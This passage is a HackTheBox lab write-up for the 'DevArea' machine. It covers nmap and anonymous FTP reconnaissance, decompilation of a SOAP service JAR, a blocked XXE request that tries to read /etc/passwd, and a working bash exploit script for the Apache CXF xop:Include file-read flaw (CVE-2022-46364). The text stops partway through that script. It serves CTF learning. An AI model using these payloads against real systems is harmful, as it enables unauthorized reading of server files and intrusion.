---
title: DevArea
os: Linux
difficulty: Medium
tags:
  - FTP Anonymous
  - Decompilation
  - Apache CXF
  - LFI
  - Hoverfly
  - Middleware RCE
  - Flask Unsign
  - Cookie Forgery
  - World-Writable Binary
  - Privilege Escalation
  - CVE-2022-46364
  - CVE-2025-54123
---

# 🛡️ HTB - DevArea (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DevArea
- **Operating System:** Linux
- **Difficulty:** Medium
- **Vulnerabilities:** Apache CXF XOP Include LFI (CVE-2022-46364), Hoverfly Middleware RCE (CVE-2025-54123), SysWatch Flask Session Cookie Forgery, World-Writable `/bin/bash` Privilege Escalation

---

```text
\----------------------------------------------------------------------------Dev AreaNotes---------------------------------------------------------------------------------------------------
```

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.14.43

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-29 13:52 UTC

Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan

Service scan Timing: About 100.00% done; ETC: 13:53 (0:00:00 remaining)

Nmap scan report for 10.129.14.43

Host is up (0.25s latency).

Not shown: 994 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

21/tcp   open  ftp     vsftpd 3.0.5

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub

| ftp-syst:

|   STAT:

| FTP server status:

|      Connected to ::ffff:10.10.15.183

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 1

|      vsFTPd 3.0.5 - secure, fast, stable

|_End of status

22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)

|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)

80/tcp   open  http    Apache httpd 2.4.58

|_http-title: Did not follow redirect to http://devarea.htb/

|_http-server-header: Apache/2.4.58 (Ubuntu)

8080/tcp open  http    Jetty 9.4.27.v20200227

|_http-server-header: Jetty(9.4.27.v20200227)

|_http-title: Error 404 Not Found

8500/tcp open  fmtp?

| fingerprint-strings:

|   FourOhFourRequest:

|     HTTP/1.0 500 Internal Server Error

|     Content-Type: text/plain; charset=utf-8

|     X-Content-Type-Options: nosniff

|     Date: Sun, 29 Mar 2026 13:52:40 GMT

|     Content-Length: 64

|     This is a proxy server. Does not respond to non-proxy requests.

|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:

|     HTTP/1.1 400 Bad Request

|     Content-Type: text/plain; charset=utf-8

|     Connection: close

|     Request

|   GetRequest:

|     HTTP/1.0 500 Internal Server Error

|     Content-Type: text/plain; charset=utf-8

|     X-Content-Type-Options: nosniff

|     Date: Sun, 29 Mar 2026 13:52:08 GMT

|     Content-Length: 64

|     This is a proxy server. Does not respond to non-proxy requests.

|   HTTPOptions:

|     HTTP/1.0 500 Internal Server Error

|     Content-Type: text/plain; charset=utf-8

|     X-Content-Type-Options: nosniff

|     Date: Sun, 29 Mar 2026 13:52:09 GMT

|     Content-Length: 64

|_    This is a proxy server. Does not respond to non-proxy requests.

8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

|_http-title: Hoverfly Dashboard

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port8500-TCP:V=7.94SVN%I=7%D=3/29%Time=69C92E9C%P=x86_64-pc-linux-gnu%r

SF:(GenericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x

SF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba

SF:d\\x20Request")%r(GetRequest,E9,"HTTP/1\\.0\\x20500\\x20Internal\\x20Server\\

SF:x20Error\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-

SF:Type-Options:\\x20nosniff\\r\\nDate:\\x20Sun,\\x2029\\x20Mar\\x202026\\x2013:52

SF::08\\x20GMT\\r\\nContent-Length:\\x2064\\r\\n\\r\\nThis\\x20is\\x20a\\x20proxy\\x20

SF:server\\.\\x20Does\\x20not\\x20respond\\x20to\\x20non-proxy\\x20requests\\.\\n")

SF:%r(HTTPOptions,E9,"HTTP/1\\.0\\x20500\\x20Internal\\x20Server\\x20Error\\r\\nC

SF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Options:

SF:\\x20nosniff\\r\\nDate:\\x20Sun,\\x2029\\x20Mar\\x202026\\x2013:52:09\\x20GMT\\r\\

SF:nContent-Length:\\x2064\\r\\n\\r\\nThis\\x20is\\x20a\\x20proxy\\x20server\\.\\x20D

SF:oes\\x20not\\x20respond\\x20to\\x20non-proxy\\x20requests\\.\\n")%r(RTSPReques

SF:t,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain

SF:;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request

SF:")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te

SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2

SF:0Request")%r(SSLSessionReq,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCo

SF:ntent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n

SF:\\r\\n400\\x20Bad\\x20Request")%r(TerminalServerCookie,67,"HTTP/1\\.1\\x20400

SF:\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n

SF:Connection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(TLSSessionReq,67,

SF:"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20

SF:charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(

SF:Kerberos,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20tex

SF:t/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20

SF:Request")%r(FourOhFourRequest,E9,"HTTP/1\\.0\\x20500\\x20Internal\\x20Serve

SF:r\\x20Error\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Conten

SF:t-Type-Options:\\x20nosniff\\r\\nDate:\\x20Sun,\\x2029\\x20Mar\\x202026\\x2013:

SF:52:40\\x20GMT\\r\\nContent-Length:\\x2064\\r\\n\\r\\nThis\\x20is\\x20a\\x20proxy\\x

SF:20server\\.\\x20Does\\x20not\\x20respond\\x20to\\x20non-proxy\\x20requests\\.\\n

SF:");

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=21%CT=1%CU=32999%PV=Y%DS=2%DC=T%G=Y%TM=69C9

OS:2F13%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP

OS:=FD%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=108%TI=Z%CI=Z%

OS:II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR=108

OS:%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O

OS:4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=

OS:FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=

OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A

OS:%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y

OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR

OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU

OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)

HOP RTT       ADDRESS

1   252.93 ms 10.10.14.1

2   237.86 ms 10.129.14.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 133.58 seconds

&#x20;
```

- 🔍 *Well Well , FTP with anonymous login enabled Interesting!*

- 🔍 *Lets Take a look at the FTP*

```text
ftp devarea.htb

Connected to devarea.htb.

220 (vsFTPd 3.0.5)

Name (devarea.htb:kali): anonymous

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||41410|)

150 Here comes the directory listing.

drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub

226 Directory send OK.

ftp> cd pub

250 Directory successfully changed.

ftp> ls

229 Entering Extended Passive Mode (|||46068|)

150 Here comes the directory listing.

\-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar

226 Directory send OK.

ftp> get employee-service.jar

local: employee-service.jar remote: employee-service.jar

229 Entering Extended Passive Mode (|||48727|)

150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).

100% |*******|  6293 KiB  233.25 KiB/s    00:00 ETA

226 Transfer complete.

6445030 bytes received in 00:27 (231.07 KiB/s)

ftp>

ftp> quit

221 Goodbye.

&#x20;
```

- 🔍 *Got an employee-service.jar file*

- 🔍 *Lets now unzip the content*

```text
&#x20;unzip employe* -d target_directory/

ls

about.html  htb    jetty-dir.css  mozilla  OSGI-INF

com         javax  META-INF       org      schemas

&#x20;
```

- 🔍 *There are bunch of files. but our main, target is this htb folder*

```text
┌──(root㉿fsocity)-[/home/…/HTB/Season-10/DevArea/target_directory]

└─# cd htb

&#x20;

┌──(root㉿fsocity)-[/home/…/Season-10/DevArea/target_directory/htb]

└─# ls

devarea

&#x20;

┌──(root㉿fsocity)-[/home/…/Season-10/DevArea/target_directory/htb]

└─# cd devarea

&#x20;

┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]

└─# ls

EmployeeService.class      Report.class

EmployeeServiceImpl.class  ServerStarter.class
```

- 🔍 *So there are these employeeservice java files, that need to be complied in order to see the content*

```text
┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]

└─# javap -c -p EmployeeServiceImpl.class

Compiled from "EmployeeServiceImpl.java"

public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeService {

&#x20; public htb.devarea.EmployeeServiceImpl();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: invokespecial #1                  // Method java/lang/Object."<init>":()V

&#x20;      4: return

&#x20; public java.lang.String submitReport(htb.devarea.Report);

&#x20;   Code:

&#x20;      0: aload_1

&#x20;      1: invokevirtual #2                  // Method htb/devarea/Report.isConfidential:()Z

&#x20;      4: ifeq          32

&#x20;      7: new           #3                  // class java/lang/StringBuilder

&#x20;     10: dup

&#x20;     11: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V

&#x20;     14: ldc           #5                  // String Report marked confidential. Thank you,

&#x20;     16: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     19: aload_1

&#x20;     20: invokevirtual #7                  // Method htb/devarea/Report.getEmployeeName:()Ljava/lang/String;

&#x20;     23: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     26: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;

&#x20;     29: goto          54

&#x20;     32: new           #3                  // class java/lang/StringBuilder

&#x20;     35: dup

&#x20;     36: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V

&#x20;     39: ldc           #9                  // String Report received from

&#x20;     41: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     44: aload_1

&#x20;     45: invokevirtual #7                  // Method htb/devarea/Report.getEmployeeName:()Ljava/lang/String;

&#x20;     48: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     51: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;

&#x20;     54: astore_2

&#x20;     55: new           #3                  // class java/lang/StringBuilder

&#x20;     58: dup

&#x20;     59: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V

&#x20;     62: aload_2

&#x20;     63: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     66: ldc           #10                 // String . Department:

&#x20;     68: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     71: aload_1

&#x20;     72: invokevirtual #11                 // Method htb/devarea/Report.getDepartment:()Ljava/lang/String;

&#x20;     75: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     78: ldc           #12                 // String . Content:

&#x20;     80: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     83: aload_1

&#x20;     84: invokevirtual #13                 // Method htb/devarea/Report.getContent:()Ljava/lang/String;

&#x20;     87: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     90: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;

&#x20;     93: areturn

}

&#x20;

&#x20;

┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]

└─# javap -c -p EmployeeService.class

Compiled from "EmployeeService.java"

public interface htb.devarea.EmployeeService {

&#x20; public abstract java.lang.String submitReport(htb.devarea.Report);

}

&#x20;

┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]

└─# javap -c -p Report.class

Compiled from "Report.java"

public class htb.devarea.Report {

&#x20; private java.lang.String employeeName;

&#x20; private java.lang.String department;

&#x20; private java.lang.String content;

&#x20; private boolean confidential;

&#x20; public htb.devarea.Report();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: invokespecial #1                  // Method java/lang/Object."<init>":()V

&#x20;      4: return

&#x20; public java.lang.String getEmployeeName();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: getfield      #2                  // Field employeeName:Ljava/lang/String;

&#x20;      4: areturn

&#x20; public void setEmployeeName(java.lang.String);

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: aload_1

&#x20;      2: putfield      #2                  // Field employeeName:Ljava/lang/String;

&#x20;      5: return

&#x20; public java.lang.String getDepartment();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: getfield      #3                  // Field department:Ljava/lang/String;

&#x20;      4: areturn

&#x20; public void setDepartment(java.lang.String);

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: aload_1

&#x20;      2: putfield      #3                  // Field department:Ljava/lang/String;

&#x20;      5: return

&#x20; public java.lang.String getContent();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: getfield      #4                  // Field content:Ljava/lang/String;

&#x20;      4: areturn

&#x20; public void setContent(java.lang.String);

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: aload_1

&#x20;      2: putfield      #4                  // Field content:Ljava/lang/String;

&#x20;      5: return

&#x20; public boolean isConfidential();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: getfield      #5                  // Field confidential:Z

&#x20;      4: ireturn

&#x20; public void setConfidential(boolean);

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: iload_1

&#x20;      2: putfield      #5                  // Field confidential:Z

&#x20;      5: return

&#x20; public java.lang.String toString();

&#x20;   Code:

&#x20;      0: new           #6                  // class java/lang/StringBuilder

&#x20;      3: dup

&#x20;      4: invokespecial #7                  // Method java/lang/StringBuilder."<init>":()V

&#x20;      7: ldc           #8                  // String Report{employeeName=\\'

&#x20;      9: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     12: aload_0

&#x20;     13: getfield      #2                  // Field employeeName:Ljava/lang/String;

&#x20;     16: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     19: bipush        39

&#x20;     21: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;

&#x20;     24: ldc           #11                 // String , department=\\'

&#x20;     26: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     29: aload_0

&#x20;     30: getfield      #3                  // Field department:Ljava/lang/String;

&#x20;     33: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     36: bipush        39

&#x20;     38: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;

&#x20;     41: ldc           #12                 // String , content=\\'

&#x20;     43: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     46: aload_0

&#x20;     47: getfield      #4                  // Field content:Ljava/lang/String;

&#x20;     50: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     53: bipush        39

&#x20;     55: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;

&#x20;     58: ldc           #13                 // String , confidential=

&#x20;     60: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;

&#x20;     63: aload_0

&#x20;     64: getfield      #5                  // Field confidential:Z

&#x20;     67: invokevirtual #14                 // Method java/lang/StringBuilder.append:(Z)Ljava/lang/StringBuilder;

&#x20;     70: bipush        125

&#x20;     72: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;

&#x20;     75: invokevirtual #15                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;

&#x20;     78: areturn

}

&#x20;

&#x20;

┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]

└─# javap -c -p ServerStarter.class

Compiled from "ServerStarter.java"

public class htb.devarea.ServerStarter {

&#x20; public htb.devarea.ServerStarter();

&#x20;   Code:

&#x20;      0: aload_0

&#x20;      1: invokespecial #1                  // Method java/lang/Object."<init>":()V

&#x20;      4: return

&#x20; public static void main(java.lang.String[]);

&#x20;   Code:

&#x20;      0: new           #2                  // class org/apache/cxf/jaxws/JaxWsServerFactoryBean

&#x20;      3: dup

&#x20;      4: invokespecial #3                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean."<init>":()V

&#x20;      7: astore_1

&#x20;      8: aload_1

&#x20;      9: ldc           #4                  // class htb/devarea/EmployeeService

&#x20;     11: invokevirtual #5                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setServiceClass:(Ljava/lang/Class;)V

&#x20;     14: aload_1

&#x20;     15: new           #6                  // class htb/devarea/EmployeeServiceImpl

&#x20;     18: dup

&#x20;     19: invokespecial #7                  // Method htb/devarea/EmployeeServiceImpl."<init>":()V

&#x20;     22: invokevirtual #8                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setServiceBean:(Ljava/lang/Object;)V

&#x20;     25: aload_1

&#x20;     26: ldc           #9                  // String http://0.0.0.0:8080/employeeservice

&#x20;     28: invokevirtual #10                 // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setAddress:(Ljava/lang/String;)V

&#x20;     31: aload_1

&#x20;     32: invokevirtual #11                 // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.create:()Lorg/apache/cxf/endpoint/Server;

&#x20;     35: pop

&#x20;     36: getstatic     #12                 // Field java/lang/System.out:Ljava/io/PrintStream;

&#x20;     39: ldc           #13                 // String Employee Service running at http://localhost:8080/employeeservice

&#x20;     41: invokevirtual #14                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V

&#x20;     44: getstatic     #12                 // Field java/lang/System.out:Ljava/io/PrintStream;

&#x20;     47: ldc           #15                 // String WSDL available at http://localhost:8080/employeeservice?wsdl

&#x20;     49: invokevirtual #14                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V

&#x20;     52: return

}
```

- 🔍 *Breakdown --->*

```text
EmployeeService.class: The Interface. It defines the "contract" (the names of the methods) but contains no actual code logic.

EmployeeServiceImpl.class: The Logic. This is the most important file; it contains the submitReport method that processes your input and returns the string. (possibly XXE)

Report.class: The Data Model. This defines what a "Report" object looks like (fields for employeeName, department, content, and the isConfidential flag).

ServerStarter.class: The Entry Point. This starts the web server, sets the port (8080), and maps the EmployeeService to the /employeeservice URL you found in the WSDL.
```

- 🔍 *Now this makes sense! the port 8080 jetty wasn't just nothing, it was meant to view these XML files!*

- 🔍 *Lets view these wsdl content*

> [!IMPORTANT]
> the application is running a SOAP (Simple Object Access Protocol) web service. In SOAP, the WSDL (Web Services Description Language) file is a public XML document that describes how to interact with the service—listing available methods, expected parameters, and data formats.

- 🔍 *in short the wsdl file can be a blueprint, which ultimately tells us what type of XML, does this server accepts (will use it in XXE)*

- 🔍 *lets look at the wsdl file*

```text
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">

wsdl:types

<xs:schema elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">

<xs:element name="submitReport" type="tns:submitReport"/>

<xs:element name="submitReportResponse" type="tns:submitReportResponse"/>

<xs:complexType name="submitReport">

xs:sequence

<xs:element minOccurs="0" name="arg0" type="tns:report"/>

</xs:sequence>

</xs:complexType>

<xs:complexType name="report">

xs:sequence

</xs:sequence>

</xs:complexType>

<xs:complexType name="submitReportResponse">

</xs:complexType>

</xs:schema>

</wsdl:types>

<wsdl:message name="submitReport">

<wsdl:part element="tns:submitReport" name="parameters"> </wsdl:part>

</wsdl:message>

<wsdl:message name="submitReportResponse">

</wsdl:message>

<wsdl:portType name="EmployeeService">

<wsdl:operation name="submitReport">

</wsdl:operation>

</wsdl:portType>

<wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">

<soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>

<wsdl:operation name="submitReport">

<soap:operation soapAction="" style="document"/>

<wsdl:input name="submitReport">

<soap:body use="literal"/>

</wsdl:input>

<wsdl:output name="submitReportResponse">

<soap:body use="literal"/>

</wsdl:output>

</wsdl:operation>

</wsdl:binding>

<wsdl:service name="EmployeeServiceService">

<wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">

<soap:address location="http://devarea.htb:8080/employeeservice"/>

</wsdl:port>

</wsdl:service>

</wsdl:definitions>
```

> [!IMPORTANT]
> Connection with XXE

```text
The connection to XXE (XML External Entity Injection) is critical because SOAP services communicate exclusively using XML.

Implicit Attack Surface: Since a SOAP service is built to parse XML by design, it is a prime target for XXE. If the underlying XML parser is "weakly configured" (i.e., it allows external entities), an attacker can inject a malicious payload into the SOAP request body.

Exploitation via Parameters: You can replace a normal parameter in a SOAP request (like a username or report content) with an XML entity that points to a sensitive file on the server (e.g., /etc/passwd).

WSDL as a Map: The WSDL you found is your map for the attack. It tells you exactly which XML tags (parameters) the server is expecting, so you know where to inject your XXE payload to ensure it gets processed by the server's logic.
```

- 🔍 *Now we have everything, now lets create the XML with the acceptable structure, to read the /etc/passwd*

```text
POST /employeeservice HTTP/1.1

Host: devarea.htb:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Content-Type: text/xml

Content-Length: 535

Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org" xmlns:dev="http://devarea.htb">

&#x20;  soapenv:Header/

&#x20;  soapenv:Body

&#x20;     dev:submitReport

&#x20;        <arg0>

&#x20;           <employeeName>Admin</employeeName>

&#x20;           <department>IT</department>

&#x20;           <content>&xxe;</content>

&#x20;        </arg0>

&#x20;     </dev:submitReport>

&#x20;  </soapenv:Body>

</soapenv:Envelope>
```

- 🔍 *Send this via burpsuite*

```text
HTTP/1.1 500 Server Error

Connection: close

Date: Sun, 29 Mar 2026 15:17:48 GMT

Content-Type: text/xml;charset=iso-8859-1

Content-Length: 325

Server: Jetty(9.4.27.v20200227)

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">soap:Bodysoap:Fault<faultcode>soap:Client</faultcode><faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT or END_ELEMENT.

&#x20;at [row,col {unknown-source}]: [2,14]</faultstring></soap:Fault></soap:Body></soap:Envelope>
```

- 🔍 *Okay so we got an error!!*

> [!IMPORTANT]
> The error "Received event DTD, instead of START_ELEMENT" means the XML parser on this server (Jetty/CXF) has DTD processing disabled. It sees your <!DOCTYPE block and immediately throws a 500 error because it wasn't expecting a Document Type Definition.

> [!NOTE]
> 1. Why simple XXE failed

```text
The error you received earlier ("Received event DTD, instead of START_ELEMENT") explains exactly why the first attempt failed.

The Guardrail: Modern XML parsers (like the one in your Jetty/CXF server) are often configured with a security setting that completely disables DTD (Document Type Definition) processing.

The Result: When you sent <!DOCTYPE ...>, the parser saw it as a violation of its security policy and killed the request before even looking at your payload. It didn't "block" the file read; it blocked the syntax used to define the entity.
```

> [!NOTE]
> 1. Why this worked (CVE-2022-46364)

```text
The script exploits a specific flaw in Apache CXF (the framework running your SOAP service).

The "Double Fetch": When the server receives an xop:Include tag, the CXF framework automatically resolves the href. It fetches the file (/etc/passwd) before the Java code even sees it.

Automatic Base64: Because /etc/passwd contains characters that could break XML (like : or newlines), Apache CXF automatically Base64 encodes the file content to keep the XML "legal."

The "Mirror" Effect: Your EmployeeServiceImpl.class logic takes the employeeName and returns it in the response: "Report received from [EmployeeName]". Since the framework replaced your tag with the Base64-encoded file, the server literally hands you the encoded file in its "Hello" message.
```

- 🔍 *have created a bash script that will get the etc/passwd info*

```text
#!/bin/bash

# ===========================

# CVE-2022-46364 - Apache CXF XOP Include LFI

# Usage: bash lfi.sh file:///etc/passwd

# ===========================

# TODO: set your target URL here

TARGET="http://devarea.htb:8080/employeeservice"

if [ -z "$1" ]; then

&#x20;   echo "Usage: $0 <file_path>"

&#x20;   echo "Ex:    $0 file:///etc/passwd"

&#x20;   echo "       $0 file:///home/dev_ryan/user.txt"

&#x20;   exit 1

fi

FILE="$1"

RESPONSE=$(curl -s -X POST "$TARGET" \\

&#x20; -H 'Content-Type: multipart/related; type="application/xop+xml"; start="root.message@cxf.apache.org"; start-info="text/xml"; boundary="----=_Part_1"' \\

&#x20; -d $'------=_Part_1\\r\\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\\r\\nContent-Transfer-Encoding: 8bit\\r\\nContent-ID: root.message@cxf.apache.org\\r\\n\\r\\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\\r\\n   soapenv:Header/\\r\\n   soapenv:Body\\r\\n      dev:submitReport\\r\\n         <arg0>\\r\\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$FILE"'"/></employeeName>\\r\\n            <department>IT</department>\\r\\n            <content>test</content>\\r\\n            <confidential>false</confidential>\\r\\n         </arg0>\\r\\n      </dev:submitReport>\\r\\n   </soapenv:Body>\\r\\n</soapenv:Envelope>\\r\\n------=_Part_1--')

# Try to extract base64 from the employeeName field

B64=$(echo "$RESPONSE" | grep -oP 'from \\K[^.]+')

if [ -z "$B64" ]; then

&#x20;   # Fallback: extract directly from XML tag

&#x20;   B64=$(echo "$RESPONSE" | grep -oP '(?<=<employeeName>)[^<]+')

